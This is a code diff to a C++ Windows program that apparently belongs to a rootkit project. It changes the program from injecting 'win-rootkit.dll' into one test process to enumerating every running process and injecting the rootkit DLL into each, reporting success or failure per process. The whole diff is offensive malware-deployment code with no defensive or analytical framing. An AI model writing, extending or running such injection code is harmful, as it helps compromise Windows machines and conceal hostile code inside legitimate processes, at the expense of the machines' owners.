@@ -3,41 +3,54 @@
 #include <stdexcept>
 #include <iostream>
 #include <vector>
+#include <map>
 
 #include "dll_injector.h"
 
 
-int get_pid_by_name(std::string name)
+std::map<std::string, int> get_process_list()
 {
+	std::map<std::string, int> processes;
 	PROCESSENTRY32 entry;
 	entry.dwSize = sizeof(PROCESSENTRY32);
-	int pid = 0;
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
 	if (Process32First(snapshot, &entry) == TRUE)
 	{
 		while (Process32Next(snapshot, &entry) == TRUE)
 		{
-			if (std::string(entry.szExeFile) == name)
-			{
-				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
-				pid = entry.th32ProcessID;
-				CloseHandle(hProcess);
-				break;
-			}
+			processes[entry.szExeFile] = entry.th32ProcessID;
 		}
 	}
 	CloseHandle(snapshot);
-	return pid;
+	return processes;
 }
 
-
-int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+int get_pid_by_name(std::string name)
 {
-	DllInjector injector("C:\\win-rootkit.dll");
-	int pid = get_pid_by_name("test.exe");
-	if (!pid)
-		return 1;
-	injector.inject_into_pid(pid);
+	auto processes = get_process_list();
+	if (processes.find(name) == processes.end())
+		return 0;
+	return processes[name];
+}
+
+//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+int main()
+{
+	DllInjector injector("C:\\Users\\Win\\win-rootkit\\vs-project\\Release\\win-rootkit.dll");
+	for (auto& pair : get_process_list())
+	{
+		try
+		{
+			injector.inject_into_pid(pair.second);
+			std::cout << "SUCCESS; Process name: " << pair.first << std::endl;
+		}
+		catch (std::runtime_error& e)
+		{
+			std::cout << "FAIL; Process name: " << pair.first << std::endl;
+			continue;
+		}
+	}
+	system("pause");
 	return 0;
 }
